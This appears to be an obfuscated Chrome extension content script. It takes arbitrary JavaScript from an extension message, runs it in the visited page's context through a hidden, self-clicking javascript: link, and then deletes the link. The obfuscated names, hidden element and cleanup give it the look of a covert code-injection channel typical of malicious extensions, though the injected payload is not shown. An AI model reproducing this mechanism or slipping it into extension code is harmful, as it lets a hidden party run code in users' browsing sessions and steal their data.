$(document).ready(function () {
    chrome.runtime.onMessage.addListener(function (_0x34576e, _0x2d8df4, _0x1f4640) {
      if (document.getElementById("ngonoo")) {} else {
        document.head.innerHTML += "<a id=\"tmp_js\" href=\"javascript: " + escape(_0x34576e.data_js) + "\" style=\"display: none;\"></a>";
        document.getElementById("tmp_js").click();
        setTimeout(function () {
          var _0x54bb6d = document.getElementById("tmp_js");
          if (_0x54bb6d) {
            var _0x54bb6d = document.getElementById("tmp_js");
            _0x54bb6d.remove();
          }
        }, 0x64);
      }
      return true;
    });
  });